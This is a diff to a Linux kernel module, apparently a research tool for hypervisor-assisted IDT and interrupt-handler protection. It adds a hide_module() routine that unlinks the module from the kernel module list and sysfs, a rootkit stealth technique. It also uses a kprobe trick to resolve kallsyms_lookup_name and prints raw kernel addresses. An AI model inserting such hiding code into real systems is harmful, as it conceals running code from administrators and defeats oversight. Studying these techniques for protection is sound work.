@@ -46,7 +46,6 @@ KPROBE_PRE_HANDLER(handler_pre1)
   return 0;
 }
 
-
 static int do_register_kprobe(struct kprobe *kp, char *symbol_name, void *handler)
 {
   int ret;
@@ -137,17 +136,15 @@ static void protect_idt_hypercall(void)
 {
    /*  
    *   putting parameters into registers,
-   *   then triggering the vmexit using the
-   *   out instruction in iowrite 32
+   *   then triggering the vmexit
    */
-    struct irq_desc *desc_start;
-    desc_start = i2d_pointer(0);
-    __asm__ volatile("mov %0, %%r8" ::"r"(desc_start));
-    __asm__ volatile("mov %0, %%r9" ::"r"(irq_desc_pci));
-    __asm__ volatile("mov %0, %%r10" ::"r"(irqaction_pci));
+    __asm__ volatile("movq %0, %%r8" ::"r"(THIS_MODULE->core_layout.base));
+    __asm__ volatile("mov %0, %%r9" ::"r"(&(irq_desc_pci->action))); /* address of the head of the list of irqaction */
+    __asm__ volatile("mov %0, %%r10" ::"r"(irqaction_pci)); /* the irq action pointing to the handler */
     __asm__ volatile("mov %0, %%r11" ::"r"(sizeof(struct irqaction)));
     __asm__ volatile("mov %0, %%r12" ::"r"(sizeof(struct irq_desc)));
-    iowrite32(0x1, mmio + PROTECT_IDT_COMMAND);
+    __asm__ volatile("mov %0, %%rax" ::"r"(mmio + PROTECT_IDT_COMMAND));
+    __asm__ volatile("movq $1, (%%rax)"::); /* triggering the hypercall */
 }
 
 static void walk_irqactions(int irq)
@@ -176,6 +173,18 @@ static void walk_irqactions(int irq)
     }
 }
 
+static void show_module_base_and_size(void)
+{
+    printk("Module base address: %px, Size: 0x%x\n", THIS_MODULE->core_layout.base, THIS_MODULE->core_layout.size);
+}
+
+static void hide_module(void)
+{
+    list_del_init(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+
+
 static int m1_init(void)
 {
     int ret;
@@ -183,6 +192,7 @@ static int m1_init(void)
     store_idt(descriptor);
     printk("FX - Forced eXecution module started \n");
     printk("IDT address is 0x%lx, size %d", descriptor->address, (int)descriptor->size);
+    pr_info("irq_handler address %px\n", irq_handler);
 
     /* double kprobe technique */
     ret = do_register_kprobe(&kp0, "kallsyms_lookup_name", handler_pre0);
@@ -208,6 +218,9 @@ static int m1_init(void)
 
     kfree(descriptor);
     descriptor = NULL;
+
+    show_module_base_and_size();
+    hide_module();
     return 0;
 }
 
